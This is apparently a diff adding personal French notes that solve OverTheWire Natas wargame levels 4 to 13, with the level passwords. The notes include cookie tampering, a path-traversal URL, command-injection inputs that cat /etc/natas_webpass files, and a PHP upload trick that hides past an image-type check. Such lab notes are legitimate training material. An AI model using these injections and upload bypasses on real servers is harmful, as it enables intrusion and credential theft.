@@ -1,0 +1,68 @@
+natas4:
+Aller sur natas5, faire annuler
+Modifier l'html pour ajouter un lien vers natas4
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+natas5:
+Utiliser un utilitaire pour modifier le cookie loggedin
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+natas6:
+Aller sur
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+natas7:
+Le code source nous dit d'aller sur
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+natas8:
+exécuter ce code dans le terminal. C'est l'opération inverse de la fonction encodeSecret
+php -r "echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\"))).\"\n\";"
+Entrer le résultat sur la page
+
+natas9:
+Les mots de passes ont une longueur de 32. Il est possible de faire un grep qui filtre par longueur
+Il faut essayer d'injecter une commande pour que la command sur le serveur soit
+grep -i xyz dictionary.txt ; MACOMMANDE ; grep -i xyz dictionary.txt
+Donc on insert
+xyz dictionary.txt ; MACOMMANDE ; grep -i xyz
+
+xyz dictionary.txt ; ls ; grep -i xyz
+nous donne
+	dictionary.txt
+	index-source.html
+	index.php
+	index.php.tmpl
+Et on peut voyager dans le serveur comme on veut
+On peut même juste faire ; ls ;
+
+MACOMMANDE doit être une commande qui trouve le mdp
+A natas7, on avait le chemin des mdp. On fait
+; cat /etc/natas_webpass/natas10 ;
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+natas10
+Même que natas9 mais sans certains caractères
+c /etc/natas_webpass/natas11 #
+Par essais erreur, on arrive au c qui est une lettre du mdp
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+natas11
+run le code join, remplacer le cookie de base par celui là. Ne pas oublier le %3D à la fin du cookie
+EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+natas12:
+Une piste : On peut uploader des fichiers, donc pq pas essayer de choper le mot de passe avec un fichier php en allant regarder dans /etc/natas_webpass/natas13
+
+Il faut uploader le fichier join et modifier la valeur de filename par une valeur .php
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+
+natas13:
+pareil que natas12 mais il y a une vérification sur le fuchier uploadé (lol, surement une vérif de merde)
+exif_imagetype regarde les premier bytes du fichier pour voir si c'est une image. Une solution serait de prendre une image et y ajouter notre fichier espion dedans après ces premier bytes
+
+
+
